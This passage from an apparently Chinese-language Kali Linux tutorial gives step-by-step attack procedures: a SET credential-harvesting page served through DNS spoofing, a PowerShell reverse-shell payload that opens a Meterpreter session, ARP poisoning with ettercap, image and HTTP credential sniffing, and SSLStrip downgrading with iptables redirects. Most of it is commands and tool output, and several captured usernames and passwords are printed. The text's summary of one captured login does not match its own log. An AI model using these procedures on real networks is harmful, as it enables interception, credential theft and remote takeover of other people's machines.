s]</span><br></pre></td></tr></table></figure><p>看到以上输出的信息，表示成功实施了DNS欺骗。此时，当目标主机访问任何网页时，将被欺骗到攻击主机（192.168.100.186）创建的伪页面。</p></li><li><p>假设目标用户将访问腾讯站点 <a href="http://www.qq.com" target="_blank" rel="noopener">http://www.qq.com</a> ，将显示如下图所示的页面。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%8711.png" alt="图片11"></p></li><li><p>从图中可以看到，访问到的页面是登录Google服务器，但是，地址栏中请求的网址仍然是 <a href="http://www.qq.com/" target="_blank" rel="noopener">http://www.qq.com/</a> 。此时，当目标用户输入登录信息登录Google服务器时，其登录信息将被攻击主机捕获到，并在终端显示捕获到的信息。如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">192.168.100.115 - - [29/Dec/2020 02:33:11] <span class="string">"GET / HTTP/1.1"</span> 200 -</span><br><span class="line">192.168.100.115 - - [29/Dec/2020 02:33:11] <span class="string">"GET /favicon.ico HTTP/1.1"</span> 404 -</span><br><span class="line">192.168.100.115 - - [29/Dec/2020 02:33:15] <span class="string">"GET /favicon.ico HTTP/1.1"</span> 404 -</span><br><span class="line">[*] WE GOT A HIT! Printing the output:</span><br><span class="line">PARAM: GALX=SJLCkfgaqoM</span><br><span class="line">PARAM: <span class="built_in">continue</span>=https://accounts.google.com/o/oauth2/auth?zt=ChRsWFBwd2JmV1hIcDhtUFdldzBENhIfVWsxSTdNLW9MdThibW1TMFQzVUZFc1BBaURuWmlRSQ%E2%88%99APsBz4gAAAAAUy4_qD7Hbfz38w8kxnaNouLcRiD3YTjX</span><br><span class="line">PARAM: service=lso</span><br><span class="line">PARAM: dsh=-7381887106725792428</span><br><span class="line">PARAM: _utf8=â</span><br><span class="line">PARAM: bgresponse=js_disabled</span><br><span class="line">PARAM: pstMsg=1</span><br><span class="line">PARAM: dnConn=</span><br><span class="line">PARAM: checkConnection=</span><br><span class="line">PARAM: checkedDomains=youtube</span><br><span class="line">POSSIBLE USERNAME FIELD FOUND: Email=chenzz@qq.com</span><br><span class="line">POSSIBLE PASSWORD FIELD FOUND: Passwd=abc.123</span><br><span class="line">PARAM: signIn=Sign+<span class="keyword">in</span></span><br><span class="line">PARAM: PersistentCookie=yes</span><br><span class="line">[*] WHEN YOU<span class="string">'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.</span></span><br></pre></td></tr></table></figure><p>从以上输出信息中可以看到，默认将生成的文件保存在/root/.set//reports目录中。此时，按回车键继续操作，将返回SET的菜单选项界面。</p></li></ol><h3 id="2-3-PowerShell攻击向量"><a href="#2-3-PowerShell攻击向量" class="headerlink" title="2.3 PowerShell攻击向量"></a>2.3 PowerShell攻击向量</h3><p>PowerShell攻击向量可以创建一个PowerShell文件。当用户将创建好的PowerShell文件发送给目标，并且目标用户执行了该文件，将可以获取一个反向远程连接。</p><p>实施PowerShell攻击向量。具体操作步骤如下：</p><ol><li><p>启动社会工程学攻击。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span>&gt; setoolkit</span><br><span class="line"></span><br><span class="line">   1) Social-Engineering Attacks</span><br><span class="line">   2) Penetration Testing (Fast-Track)</span><br><span class="line">   3) Third Party Modules</span><br><span class="line">   4) Update the Social-Engineer Toolkit</span><br><span class="line">   5) Update SET configuration</span><br><span class="line">   6) Help, Credits, and About</span><br><span class="line"></span><br><span class="line">  99) Exit the Social-Engineer Toolkit</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>&gt;</span><br></pre></td></tr></table></figure></li><li><p>选择社会工程学攻击，输入编号1。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span>&gt; 1</span><br><span class="line"></span><br><span class="line">   1) Spear-Phishing Attack Vectors</span><br><span class="line">   2) Website Attack Vectors</span><br><span class="line">   3) Infectious Media Generator</span><br><span class="line">   4) Create a Payload and Listener</span><br><span class="line">   5) Mass Mailer Attack</span><br><span class="line">   6) Arduino-Based Attack Vector</span><br><span class="line">   7) Wireless Access Point Attack Vector</span><br><span class="line">   8) QRCode Generator Attack Vector</span><br><span class="line">   9) Powershell Attack Vectors</span><br><span class="line">  10) Third Party Modules</span><br><span class="line"></span><br><span class="line">  99) Return back to the main menu.</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>&gt;</span><br></pre></td></tr></table></figure></li><li><p>选择Powershell攻击向量，输入编号9。将显示如下信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span>&gt; 9</span><br><span class="line"></span><br><span class="line">The Powershell Attack Vector module allows you to create PowerShell specific attacks. These attacks will allow you to use PowerShell <span class="built_in">which</span> is available by default <span class="keyword">in</span> all operating systems Windows Vista and above. PowerShell provides a fruitful  landscape <span class="keyword">for</span> deploying payloads and performing <span class="built_in">functions</span> that  <span class="keyword">do</span> not get triggered by preventative technologies.</span><br><span class="line"></span><br><span class="line">   1) Powershell Alphanumeric Shellcode Injector</span><br><span class="line">   2) Powershell Reverse Shell</span><br><span class="line">   3) Powershell Bind Shell</span><br><span class="line">   4) Powershell Dump SAM Database</span><br><span class="line"></span><br><span class="line">  99) Return to Main Menu</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>:powershell&gt;</span><br></pre></td></tr></table></figure></li><li><p>选择含字符和数字的Shellcode注入，输入编号1。将显示如下信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span>:powershell&gt;1</span><br><span class="line">Enter the IPAddress or DNS name <span class="keyword">for</span> the reverse host: 192.168.10.75</span><br><span class="line"><span class="built_in">set</span>:powershell&gt; Enter the port <span class="keyword">for</span> the reverse [443]:4444</span><br><span class="line">[*] Prepping the payload <span class="keyword">for</span> delivery and injecting alphanumeric shellcode...</span><br><span class="line">[*] Generating x86-based powershell injection code...</span><br><span class="line">[*] Reverse_HTTPS takes a few seconds to calculate..One moment..</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 394 bytes</span><br><span class="line">Final size of c file: 1681 bytes</span><br><span class="line">[*] Finished generating powershell injection bypass.</span><br><span class="line">[*] Encoded to bypass execution restriction policy...</span><br><span class="line">[*] If you want the powershell commands and attack, they are exported to /root/.<span class="built_in">set</span>/reports/powershell/</span><br><span class="line"><span class="built_in">set</span>&gt; Do you want to start the listener now [yes/no]: : yes</span><br><span class="line"></span><br><span class="line">…………</span><br><span class="line"></span><br><span class="line">Metasploit tip: Use the resource <span class="built_in">command</span> to run</span><br><span class="line">commands from a file</span><br><span class="line"></span><br><span class="line">[*] Processing /root/.<span class="built_in">set</span>/reports/powershell/powershell.rc <span class="keyword">for</span> ERB directives.</span><br><span class="line">resource (/root/.<span class="built_in">set</span>/reports/powershell/powershell.rc)&gt; use multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">resource (/root/.<span class="built_in">set</span>/reports/powershell/powershell.rc)&gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_https</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_https</span><br><span class="line">resource (/root/.<span class="built_in">set</span>/reports/powershell/powershell.rc)&gt; <span class="built_in">set</span> LPORT 4444</span><br><span class="line">LPORT =&gt; 4444</span><br><span class="line">resource (/root/.<span class="built_in">set</span>/reports/powershell/powershell.rc)&gt; <span class="built_in">set</span> LHOST 0.0.0.0</span><br><span class="line">LHOST =&gt; 0.0.0.0</span><br><span class="line">resource (/root/.<span class="built_in">set</span>/reports/powershell/powershell.rc)&gt; <span class="built_in">set</span> ExitOnSession <span class="literal">false</span></span><br><span class="line">ExitOnSession =&gt; <span class="literal">false</span></span><br><span class="line">resource (/root/.<span class="built_in">set</span>/reports/powershell/powershell.rc)&gt; exploit -j</span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line">msf6 exploit(multi/handler) &gt;</span><br><span class="line">[*] Started HTTPS reverse handler on https://0.0.0.0:4444</span><br></pre></td></tr></table></figure><p>以上输出信息显示了攻击主机的配置信息。此时已经成功启动了攻击载荷，等待目标主机的连接。以上设置完成后，将会在/root/.set/reports/powershell/目录下创建了一个渗透攻击代码文件。该文件是一个文本文件，其文件名为x86_powershell_injection.txt。</p></li><li><p>此时，可以将x86_powershell_injection.txt文件中的内容复制到目标主机（Windows 7）的DOS下，运行该脚本内容。或者，直接将该文件复制到目标主机，并将文件的后缀名改为.bat。然后，双击该文件即可运行该脚本。执行成功后，Kali主机将会显示如下信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[*] https://0.0.0.0:4444 handling request from 192.168.10.75; (UUID: raob2xub)</span><br><span class="line"> Staging x86 payload (958531 bytes) ...</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.10.75:4444 -&gt; 192.168.10.77:</span><br><span class="line">38128) at 2020-12-28 16:12:03 +0800</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，成功打开了一个Meterpreter会话。此时，使用sessions命令即可查看建立的会话连接，具体如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; sessions -i 1</span><br><span class="line">[*] Starting interaction with 1...</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><p>以上代码中看到，命令行提示符显示为meterpreter&gt;，说明成功启动了Meterpreter会话。接下来，用户则可以利用Meterpreter中支持的命令，以获取目标主机更多的信息。</p></li></ol><h2 id="三、捕获和监听网络数据"><a href="#三、捕获和监听网络数据" class="headerlink" title="三、捕获和监听网络数据"></a>三、捕获和监听网络数据</h2><p>当用户成功实施中间人攻击后，即可捕获和监听目标主机的网络数据。</p><h3 id="3-1-通用抓包工具Wireshark"><a href="#3-1-通用抓包工具Wireshark" class="headerlink" title="3.1 通用抓包工具Wireshark"></a>3.1 通用抓包工具Wireshark</h3><p>Wireshark是一款专用于网络封包的工具，可以用来捕获并分析数据包。当用户实施中间人攻击后，可以使用Wireshark来监听目标主机流经网络中的数据包。下面将介绍使用Wireshark工具捕获数据包的方法。</p><p>使用Wireshark监听目标主机的数据包。具体操作步骤如下：</p><ol><li><p>实施中间人攻击。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ettercap -Tq -M arp:remote  /192.168.10.75// /192.168.10.1//</span></span><br></pre></td></tr></table></figure></li><li><p>启动Wireshark工具。在菜单栏中依次选择“应用程序”|“嗅探/欺骗”|wireshark命令，将显示如下图所示的界面。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%8712.png" alt="图片12"></p></li><li><p>在该界面中选择监听接口eth0。然后，单击开始捕获分组按钮，将开始捕获数据包，如下图所示。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%8713.png" alt="图片13"></p></li><li><p>此时，正在监听经过接口eth0的所有数据包。当捕获到足够的数据包后，单击停止捕获分组按钮，将停止捕获数据包，如下图所示。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%8714.png" alt="图片14"></p></li><li><p>将捕获的包保存到捕获文件中。在菜单栏依次选择“文件”|“保存”命令，将显示如下图所示的界面。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%8715.png" alt="图片15"></p></li><li><p>在该界面中指定捕获文件名称及位置。然后，单击“保存”按钮，即可成功保存捕获的数据包。</p></li></ol><h3 id="3-2-捕获图片"><a href="#3-2-捕获图片" class="headerlink" title="3.2 捕获图片"></a>3.2 捕获图片</h3><p>当用户成功实施中间人攻击后，可以使用driftnet工具来捕获图片。driftnet是一款简单而实用的图片捕获工具，可以很方便地在网络数据包中抓取图片。通过与Ettercap工具配合使用，可以捕获目标主机浏览的所有图片。</p><p>driftnet工具的语法格式如下：</p><blockquote><p>driftnet [选项]</p></blockquote><p>其中，该工具可用的选项及含义如下：</p><blockquote><p>-b：捕获到新的图片时发出嘟嘟声。<br>-i interface：指定监听接口。<br>-f file：读取一个指定pcap数据包中的图片。<br>-a：后台模式。将捕获到的图片保存到目录中，即不显示在屏幕上。<br>-m number：指定保存图片的数目。<br>-d directory：指定一个临时目录，用来保存捕获到的图片。当退出driftnet工具后，将清除该目录中的临时文件。但是，不会删除其他文件。<br>-x prefix：指定保存图片的前缀名称。默认情况下，图片的前缀名称为driftnet-。</p></blockquote><p>使用driftnet工具捕获目标主机浏览的所有图片。具体操作步骤如下：</p><ol><li><p>使用Ettercap实施中间人攻击。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ettercap -Tq -M arp:remote /192.168.10.77// /192.168.10.1//</span></span><br><span class="line"></span><br><span class="line">ettercap 0.8.3.1 copyright 2001-2020 Ettercap Development Team</span><br><span class="line"></span><br><span class="line">Actual changes:</span><br><span class="line">tx-generic-segmentation: off</span><br><span class="line">rx-gro: off</span><br><span class="line">rx-lro: on [requested off]</span><br><span class="line">tx-tcp-segmentation: off</span><br><span class="line">tx-tcp-ecn-segmentation: off</span><br><span class="line">tx-tcp6-segmentation: off</span><br><span class="line">Listening on:</span><br><span class="line">  eth0 -&gt; 52:54:00:BF:D0:AC</span><br><span class="line">  192.168.10.75/255.255.255.0</span><br><span class="line">  fe80::5054:ff:febf:d0ac/64</span><br><span class="line"></span><br><span class="line">SSL dissection needs a valid <span class="string">'redir_command_on'</span> script <span class="keyword">in</span> the etter.conf file</span><br><span class="line">Privileges dropped to EUID 65534 EGID 65534...</span><br><span class="line"></span><br><span class="line">  34 plugins</span><br><span class="line">  42 protocol dissectors</span><br><span class="line">  57 ports monitored</span><br><span class="line">28230 mac vendor fingerprint</span><br><span class="line">1766 tcp OS fingerprint</span><br><span class="line">2182 known services</span><br><span class="line">Lua: no scripts were specified, not starting up!</span><br><span class="line"></span><br><span class="line">Scanning <span class="keyword">for</span> merged targets (2 hosts)...</span><br><span class="line"></span><br><span class="line">* |==================================================&gt;| 100.00 %</span><br><span class="line"></span><br><span class="line">2 hosts added to the hosts list...</span><br><span class="line"></span><br><span class="line">ARP poisoning victims:</span><br><span class="line"></span><br><span class="line"> GROUP 1 : 192.168.10.77 52:54:00:47:0E:45</span><br><span class="line"></span><br><span class="line"> GROUP 2 : 192.168.10.1 80:05:88:E6:74:7C</span><br><span class="line">Starting Unified sniffing...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Text only Interface activated...</span><br><span class="line">Hit <span class="string">'h'</span> <span class="keyword">for</span> inline <span class="built_in">help</span></span><br></pre></td></tr></table></figure><p>看到以上输出的信息，表示成功对目标实施了ARP欺骗。接下来，用户就可以使用driftnet工具监听目标主机的图片了。</p></li><li><p>使用driftnet开始监听目标主机浏览的所有图片，并指定将监听的图片临时保存到/root/image目录中。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># driftnet -i eth0 -d /root/image/</span></span><br></pre></td></tr></table></figure><p>执行以上命令后，将弹出一个driftnet终端窗口，如下图所示。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%8716.png" alt="图片16"></p></li><li><p>当捕获到目标主机浏览的图片时，显示在如下图所示的窗口中。而且，在driftnet监听的交互模式下也可以看到捕获到的图片信息。如下：</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%8717.png" alt="图片17"></p><p>从以上显示的信息中可以看到捕获到的图片信息。此时，用户进入到指定的图片保存位置/root/image目录中，即可看到捕获到的所有图片。</p></li><li><p>从该界面可以看到捕获到的图片。如果用户不希望再捕获图片，按Ctrl+C组合键可以停止监听。</p></li></ol><h3 id="3-3-监听HTTP数据"><a href="#3-3-监听HTTP数据" class="headerlink" title="3.3 监听HTTP数据"></a>3.3 监听HTTP数据</h3><p>HTTP（Hyper Text Transfer Protocol，超文本传输协议），是用于Web服务器传输超文本到本地浏览器的传送协议。通常情况下，客户端访问网页都使用的是HTTP协议。所以，用户通过使用中间人攻击，也可以监听目标用户访问的HTTP数据。由于HTTP协议是以明文方式传输数据，如果用户登录HTTP协议网站，将会监听到用户信息。下面将介绍使用Ettercap工具嗅探HTTP协议数据的方法。</p><p>使用Ettercap工具嗅探HTTP数据。具体操作步骤如下：</p><ol><li><p>使用Ettercap工具对目标实施中间人攻击。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ettercap -Tq -M arp:remote /192.168.100.115// /192.168.100.1//</span></span><br><span class="line"></span><br><span class="line">ettercap 0.8.3.1 copyright 2001-2020 Ettercap Development Team</span><br><span class="line"></span><br><span class="line">Listening on:</span><br><span class="line">  eth0 -&gt; 00:0C:29:CE:D2:12</span><br><span class="line">  192.168.100.186/255.255.255.0</span><br><span class="line">  fe80::20c:29ff:fece:d212/64</span><br><span class="line"></span><br><span class="line">SSL dissection needs a valid <span class="string">'redir_command_on'</span> script <span class="keyword">in</span> the etter.conf file</span><br><span class="line">Ettercap might not work correctly. /proc/sys/net/ipv6/conf/eth0/use_tempaddr is not <span class="built_in">set</span> to 0.</span><br><span class="line">Privileges dropped to EUID 65534 EGID 65534...</span><br><span class="line"></span><br><span class="line">  34 plugins</span><br><span class="line">  42 protocol dissectors</span><br><span class="line">  57 ports monitored</span><br><span class="line">28230 mac vendor fingerprint</span><br><span class="line">1766 tcp OS fingerprint</span><br><span class="line">2182 known services</span><br><span class="line">Lua: no scripts were specified, not starting up!</span><br><span class="line"></span><br><span class="line">Scanning <span class="keyword">for</span> merged targets (2 hosts)...</span><br><span class="line"></span><br><span class="line">* |==================================================&gt;| 100.00 %</span><br><span class="line"></span><br><span class="line">4 hosts added to the hosts list...</span><br><span class="line"></span><br><span class="line">ARP poisoning victims:</span><br><span class="line"></span><br><span class="line"> GROUP 1 : 192.168.100.115 98:8D:46:D1:77:57</span><br><span class="line"></span><br><span class="line"> GROUP 2 : 192.168.100.1 80:05:88:E6:74:7C</span><br><span class="line">Starting Unified sniffing...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Text only Interface activated...</span><br><span class="line">Hit <span class="string">'h'</span> <span class="keyword">for</span> inline <span class="built_in">help</span></span><br></pre></td></tr></table></figure><p>看到以上输出的信息，表示成功对目标实施了ARP欺骗攻击。</p></li><li><p>此时，当目标主机访问HTTP协议网站时，将会被攻击主机监听到。例如，这里登录ChinaUNIX论坛，当用户输入登录信息并进行登录后，将被攻击主机监听到。如下：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP : <span class="number">42.62</span><span class="number">.98</span><span class="number">.167</span>:<span class="number">80</span> -&gt; USER: chenzhongzhou  PASS: Abc<span class="number">.123456</span>  INFO: http:<span class="comment">//account.chinaunix.net/login/?url=http://bbs.chinaunix.net/</span></span><br><span class="line">CONTENT: username=chenzz&amp;password=<span class="number">123456</span>&amp;_token=jnPdiGJavZX3JP5FCS8DZ8Pz1FWFNxgAD9gdxo31&amp;_t=<span class="number">1609298162685</span></span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，监听到了目标主机访问ChinaUNIX论坛的登录信息，用户名为testuser，密码为password。</p></li></ol><h3 id="3-4-监听HTTPS数据"><a href="#3-4-监听HTTPS数据" class="headerlink" title="3.4 监听HTTPS数据"></a>3.4 监听HTTPS数据</h3><p>HTTPS（Hyper Text Transfer Protocol over Secure Socket Layer或Hypertext Transfer Protocol Secure，超文本传输安全协议），是以安全为目标的HTTP通道，即HTTP的安全版。对于一些安全通信网站，将会使用HTTPS协议来加密数据，如淘宝和银行网站等。其中，HTTPS协议是在HTTP下加入了SSL层，因此加密的详细内容就是SSL。此时，用户可以使用SSLStrip工具来解密SSL加密的数据，进而获取到HTTPS数据内容。下面将介绍使用SSLStrip工具来监听HTTPS数据的方法。</p><p>使用SSLstrip工具监听HTTPS数据。具体操作步骤如下：</p><ol><li><p>开启路由转发。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span></span><br></pre></td></tr></table></figure></li><li><p>通过iptables将所有HTTP数据导入到10000端口。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000</span></span><br></pre></td></tr></table></figure></li><li><p>使用SSLstrip监听10000端口，获取到目标主机传输的敏感信息。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sslstrip -a -l 10000</span></span><br><span class="line">sslstrip 0.9 by Moxie Marlinspike running...</span><br></pre></td></tr></table></figure><p>如果没有这个工具，使用如下命令安装</p><blockquote><p>wget <a href="https://github.com/moxie0/sslstrip/archive/v0.9.tar.gz" target="_blank" rel="noopener">https://github.com/moxie0/sslstrip/archive/v0.9.tar.gz</a><br>tar xf v0.9.tar.gz<br>cd sslstrip-0.9/ &amp;&amp; python setup.py install</p></blockquote><p>从输出的信息可以看到，SSLStrip工具正在运行。此时，在当前目录下将创建一个名为sslstrip.log的日志文件。通过实施监控该日志文件，可以看到目标主机传输的数据如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># tail -f sslstrip.log</span></span><br></pre></td></tr></table></figure><p>使用SSLStrip实施攻击时，可能出现一些警告信息。但是，这些信息不影响SSLStrip捕获数据包。</p><p>此时，在目标主机上访问HTTPS加密网站。如果目标用户提交敏感信息，将会被SSLStrip捕获到。例如，这里通过登录126邮箱（ <a href="https://mail.126.com" target="_blank" rel="noopener">https://mail.126.com</a> ）来验证SSLStrip攻击是否成功。当目标用户成功访问126邮箱后，将显示如下图所示的界面。</p></li></ol><ol start="4"><li><p>实施ARP欺骗攻击。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ettercap -Tq -M arp:remote /192.168.10.77// /192.168.10.1//</span></span><br></pre></td></tr></table></figure></li><li><p>从该界面可以看到，已成功显示了126邮箱的登录界面。而且，从浏览器的地址栏中可以看到已被SSLStrip工具解密为HTTP协议（ <a href="http://mail.126.com" target="_blank" rel="noopener">http://mail.126.com</a> ）。此时，用户输入用户名和密码进行登录，该信息将会被SSLStrip工具捕获到。具体显示如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2021-01-04 13:42:04,945 POST Data (passport.126.com):&#123;<span class="string">"un"</span>:<span class="string">"testuser@126.com"</span>,<span class="string">"pw"</span>:<span class="string">"S/d17ljNe/E2FR4p/Vkh04pZmLkMXVtrIFIrX+uwkRWyPxVj3T4q+fjVIpHcRIh+8DADe9xpB2IVaBXH692u6yJXOB+7tBlJggFHrUkrFuMHzxg6YOGnnH1XydhB11bqJ33crh2CQZ4xdSLaOL/VRVbJwn+xOPi2QvVwYKIhUXI="</span>,<span class="string">"pd"</span>:<span class="string">"mail126"</span>,<span class="string">"l"</span>:0,<span class="string">"d"</span>:10,<span class="string">"t"</span>:17213741378759,<span class="string">"pkid"</span>:<span class="string">"QdQXWEQ"</span>,<span class="string">"domains"</span>:<span class="string">""</span>,<span class="string">"tk"</span>:<span class="string">"7c735ac8ab9d98b9840be0bfd281c4cb"</span>,<span class="string">"pwdKeyUp"</span>:1,<span class="string">"topURL"</span>:<span class="string">"http://mail.126.com/"</span>,<span class="string">"rtid"</span>:<span class="string">"9inbIdlXGXzfbxKuIbmNUg1u0f2kQGnL"</span>&#125;</span><br><span class="line">2021-01-04 13:42:04,569 Got server response: HTTP/1.1 200 OK</span><br></pre></td></tr></table></figure><p>从以上输出信息可以看到，目标主机访问了mail.126.com网站。而且，可以看到用户提交的用户名为 <a href="mailto:testuser@126.com" target="_blank" rel="noopener">testuser@126.com</a> ，密码是加密的。</p></li></ol><h3 id="3-5-网络数据快速分析"><a href="#3-5-网络数据快速分析" class="headerlink" title="3.5 网络数据快速分析"></a>3.5 网络数据快速分析</h3><p>当用户使用Wireshark捕获到数据包时，可以借助Xplico工具来对其数据进行快速分析。Xplico工具可以快速找出用户请求的网页地址、图片和视频等内容。</p><h4 id="3-5-1-安装并启动Xplico服务"><a href="#3-5-1-安装并启动Xplico服务" class="headerlink" title="3.5.1 安装并启动Xplico服务"></a>3.5.1 安装并启动Xplico服务</h4><p>Kali Linux默认没有安装Xplico工具。所以，在使用该工具之前，需要安装该工具。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># apt-get install xplico</span></span><br></pre></td></tr></table></figure><p>执行以上命令后，如果没有报错，则说明安装成功。接下来，需要启动该服务后才可以使用。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># service xplico 